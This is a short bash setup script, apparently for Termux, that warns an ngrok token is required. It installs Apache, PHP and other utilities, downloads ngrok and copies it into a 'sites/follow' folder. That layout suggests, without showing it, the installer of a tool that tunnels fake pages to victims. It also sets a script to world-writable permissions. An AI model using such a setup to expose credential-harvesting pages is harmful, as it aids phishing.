#!/bin/bash
echo ""
chmod 777 start.sh
clear
echo ""
echo ""
echo ""
echo ""
echo -e $'\e[1;32m[\e[0m\e[1;77m+\e[0m\e[1;32m]\e[0m\e[1;33m!!! NGROK TOKEN MUST OTHERWISE SCRIPT NOT WORKING PROPERLY (ngerti ga lu?)!!! \e[0m'
sleep 4
clear
echo ""
echo ""
echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m >> DOWNLOAD REQUIREMENTS >> \e[0m'
termux-setup-storage
sudo apt-get install apache2 -y
apt install apache2 -y
apt install php -y
apt install jq -y
apt install tail -y
apt install curl -y
apt install zip -y
pkg install wget -y
clear
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip
unzip ngrok-stable-linux-arm.zip
cp -R ngrok sites/follow/
clear
echo ""
echo ""
sleep 2
clear
